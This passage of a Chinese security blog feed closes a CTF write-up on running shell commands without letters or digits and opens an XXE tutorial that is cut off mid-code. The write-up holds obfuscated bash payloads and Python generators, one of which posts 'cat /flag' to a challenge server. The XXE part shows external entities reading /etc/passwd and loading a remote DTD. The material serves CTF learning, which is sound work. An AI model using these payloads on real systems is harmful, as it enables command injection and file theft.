class="line">__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>这里多了个bash就能执行成功</p></blockquote><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-235810.png"></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h3 id="利用-构造-2"><a href="#利用-构造-2" class="headerlink" title="利用$(())构造"></a>利用$(())构造</h3><p>前面我们已经知道<code>$(())</code>用于算术运算，而默认<code>$(())</code>为0，我们尝试取反：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $((~$(())))</span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241228-003415.png"></p><p>那对-2取反呢</p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241228-003503.png"></p><p>这里又得到了1，linux中的取反操作时针对二进制进行的，那么现在就可以通过相加减获得数字。</p><blockquote><p>比如对5取反，会将5转换成二进制00000101，再取反为11111010，1表负，反转位加1即00000101表6，即-6</p></blockquote><p>根据上面的payload，我们的目的其实只用得到0，1，2，那思路不就和$?一样嘛，只用<strong>将<code>$?</code>换成<code>$(())</code>即可</strong>，这里同样进行了<strong>算术扩展解析，所以需要两个bash</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241228-003914.png"></p><p>说白了，只要能得到0，1，2，无论取反和自增都能得到想要的命令，下面尝试下取反：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0： $(())</span><br><span class="line">-1: $((~$(())))</span><br><span class="line">1:  $((~$((~$(($(())))$((~$(())))))))    </span><br><span class="line">2:  $(($((~$((~$(($(())))$((~$(())))))))&lt;&lt;$((~$((~$(($(())))$((~$(())))))))))     1&lt;&lt;1</span><br><span class="line">2：  $((~$(($((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><blockquote><p>上面是省略了+号后的式子，0取反为-1，-2取反为1，-3取反为2</p></blockquote><p>所以把上面的式子与之前payload对应的数字换掉即可，由于需要$’\154\163’</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1：$((~$(())))</span><br><span class="line">1：$((~$((~$(($(())))$((~$(())))))))</span><br><span class="line">3：$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">4: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">5: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">6: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><p>即：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash&lt;&lt;&lt;bash\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>注意2个bash</p></blockquote><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241228-033556.png"></p><p>然后就是利用变量拼接构造bash,payload:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__=$(());$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br><span class="line">//ls</span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241228-034050.png"></p><p><strong>取反脚本</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://15a309e4-9e6d-4a18-8767-7be0a1efdfa9.challenge.ctf.show/&quot;</span></span><br><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">r = &#123;&#125;</span><br><span class="line"></span><br><span class="line">x=<span class="string">&#x27;$((~$(())))&#x27;</span><span class="comment">#-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        r[i]=<span class="string">&#x27;$((~$((&#x27;</span>+x</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                r[i]+=x</span><br><span class="line">        r[i]+=<span class="string">&#x27;))))&#x27;</span></span><br><span class="line"></span><br><span class="line">r[<span class="number">0</span>]=<span class="string">&#x27;$(())&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">&#x27;\\\\&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]:</span><br><span class="line">                payload+=r[<span class="built_in">int</span>(i)]</span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r=requests.post(url,data=&#123;<span class="string">&quot;ctf_show&quot;</span>:payload,&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><strong>自增脚本</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><blockquote><p><strong>自增需要抓包后url编码传参</strong></p></blockquote><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xz.aliyun.com/news/11688?u_atoken=9341340a53a29d070e698cac517ace72&u_asig=1a0c381017412736154966901e00f3">利用shell脚本变量构造无字母数字命令</a></p><p><a href="https://www.freebuf.com/articles/system/361101.html">【bashfuck】bashshell无字母命令执行原理</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF学习 </category>
          
          <category> RCE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE学习</title>
      <link href="/2025/03/02/XXE%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/03/02/XXE%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>XXE是基于XML的攻击，所以在学习XXE前需了解什么是XML。</p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><strong>XML（Extensible Markup Language）</strong>：与HTML类似，是一种标记语言，但与HTML不同的是，<strong>XML 被设计用来传输和存储数据，而HTML 被设计用来显示数据。</strong>XML 仅仅是纯文本，更重要的是，<strong>通过 XML 可以发明自己的标签，因为 XML 没有预定义的标签</strong>。</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul><li><p><strong>把数据从 HTML 分离</strong></p><p>通过 XML，数据能够存储在独立的 XML 文件中。这样就可以专注于使用 HTML 进行布局和显示，并确保修改底层数据不再需要对 HTML 进行任何的改变。</p></li><li><p><strong>简化数据共享</strong></p><p>XML 数据以纯文本格式进行存储，因此提供了一种独立于软件和硬件的数据存储方法。</p><p>这让创建不同应用程序可以共享的数据变得更加容易。</p></li><li><p><strong>简化数据传输</strong></p><p>通过XML，可以在不兼容的系统之间轻松的交换数据。</p></li><li><p><strong>简化平台的变更</strong></p><p>升级到新的系统（硬件或软件平台），总是非常费时的。必须转换大量的数据，不兼容的数据经常会丢失。</p><p>XML 数据以文本格式存储。这使得 XML 在不损失数据的情况下，更容易扩展或升级到新的操作系统、新应用程序或新的浏览器。</p></li><li><p><strong>用于创建新的 Internet 语言</strong></p><p>很多新的 Internet 语言是通过 XML 创建的：</p><p>其中的例子包括：</p><ul><li>XHTML - 最新的 HTML 版本</li><li>WSDL - 用于描述可用的 web service</li><li>WAP 和 WML - 用于手持设备的标记语言</li><li>RSS - 用于 RSS feed 的语言</li><li>RDF 和 OWL - 用于描述资源和本体</li><li>SMIL - 用于描述针针对 web 的多媒体</li></ul></li></ul><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span>  //声明版本及编码</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>          //描述文档的根元素（像在说：“本文档是一个便签”）</span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span>   //四个子元素</span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>该 XML 文档包含了 John 给 George 的一张便签。</strong></p></blockquote><p>例：</p><p><img src="/2025/03/02/XXE%E5%AD%A6%E4%B9%A0/ct_nodetree1.gif" alt="img"></p><p>上图表示下面的 XML 中的一本书：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span>             //根元素</span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">&quot;COOKING&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>Everyday Italian<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>Giada De Laurentiis<span class="tag">&lt;/<span class="name">author</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">year</span>&gt;</span>2005<span class="tag">&lt;/<span class="name">year</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>30.00<span class="tag">&lt;/<span class="name">price</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">&quot;CHILDREN&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>Harry Potter<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>J K. Rowling<span class="tag">&lt;/<span class="name">author</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">year</span>&gt;</span>2005<span class="tag">&lt;/<span class="name">year</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>29.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">&quot;WEB&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>Learning XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>Erik T. Ray<span class="tag">&lt;/<span class="name">author</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">year</span>&gt;</span>2003<span class="tag">&lt;/<span class="name">year</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>39.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h3><p><strong>XML 元素必须遵循以下命名规则：</strong></p><ul><li><strong>名称可以含字母、数字以及其他的字符</strong></li><li><strong>名称不能以数字或者标点符号开始</strong></li><li><strong>名称不能以字符 “xml”（或者 XML、Xml）开始</strong></li><li><strong>名称不能包含空格</strong></li></ul><p><strong>可使用任何名称，没有保留的字词。</strong></p><p><strong>属性需要加引号</strong></p><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>在XML中，一些字符拥有特殊意义，直接放入XML元素中，会发生错误，因为解析器会把它当作新元素的开始。所以需要用实体代替：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在 XML 中，有 5 个预定义的实体引用</span><br><span class="line">&amp;lt;    &lt;    小于</span><br><span class="line">&amp;gt;    &gt;    大于</span><br><span class="line">&amp;amp;    &amp;    &amp;符</span><br><span class="line">&amp;apos;    &#x27;    单引</span><br><span class="line">&amp;quot;    &quot;    双引</span><br></pre></td></tr></table></figure><p>XML文档有自己的一个格式规范，这个格式规范是由一个叫做DTD（document type definition）的东西控制的：</p><p><strong>DTD 的声明方式分为两种：内部 DTD 和外部 DTD ，其区别就在于：对 XML 文档中的元素、属性和实体的 DTD 的声明是在 XML 文档内部引用还是引用外部的 DTD文件。</strong></p><p>内部TDT：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; //声明xml版本</span><br><span class="line">&lt;!DOCTYPE note [   //声明此文档是note类型的文档</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;  //声明此文档的所有元素</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;  //定义to元素的类型为PCDATA，PCDATA表示可包含任意字符串</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;  // 定义from元素类型为PCDATA</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt; // 定义heading为PCDATA</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;  // 定义body为PCDATA</span><br><span class="line">&lt;!ENTITY writer &quot;hello world&quot;&gt; // 定义一个内部实体</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget me this weekend&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p><strong>外部TDT：</strong></p><ul><li><p><strong>通用实体</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt; #定义元素为ANY，即可以接受任何元素。</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt; // 定义通用实体</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;body&gt;&amp;xxe;&lt;/body&gt; #定义一个外部实体</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><blockquote><p><code>&amp;xxe</code>用于引用，即引用后面的<code>SYSTEM &quot;file:///c:/test.dtd&quot;</code>,而<code>SYSTEM</code>引用外部资源，文件并执行。</p></blockquote><blockquote><p>除了 SYSTEM 关键字的引用方式，还有一种引用方式是使用 PUBLIC 引用公用 DTD 的方式:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure></blockquote></li><li><p><strong>参数实体</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt;</span><br><span class="line">%an-element; %remote-dtd;  //引用an-element，remote-dtd两个参数</span><br></pre></td></tr></table></figure><blockquote><p>% 实体名（这里空格不能少）在 DTD 中定义，并且只能在 DTD 中使用 %实体名。同时。参数实体同样可引用外部实体。</p></blockquote></li></ul><h2 id="XML外部实体注入"><a href="#XML外部实体注入" class="headerlink" title="XML外部实体注入"></a>XML外部实体注入</h2><p><img src="/2025/03/02/XXE%E5%AD%A6%E4%B9%A0/QQ2025lan.png"></p><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><strong>XXE（XML External Entity）是指xml外部实体攻击漏洞。XML外部实体攻击是针对解析XML输入的应用程序的一种攻击。当包含对外部实体的引用的XML输入被弱配置XML解析器处理时，就会发生这种攻击。这种攻击通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</strong></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>由于 SYSTEM 标识符引用的实体能够访问本地或远程的内容的特性，攻击者可通过控制其内容获取本地或远程文件内容。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYSTEM file:///etc/passwd</span><br></pre></td></tr></table></figure><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p><strong>判断漏洞是否存在最直接的方法就是用burp抓包，然后，修改HTTP请求方法，修改Content-Type头部字段等等，查看返回包的响应，看看应用程序是否解析了发送的内容，一旦解析了，那么有可能XXE攻击漏洞</strong></p><p>常见<strong>可能会产生xxe漏洞的文件</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dom.php # 示例：使用DOMDocument解析body</span><br><span class="line">index.php</span><br><span class="line">SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body</span><br><span class="line">simplexml_load_string.php # 示例：使用simplexml_load_string函数解析body</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="file-get-contents函数"><a href="#file-get-contents函数" class="headerlink" title="file_get_contents函数"></a><strong>file_get_contents函数</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 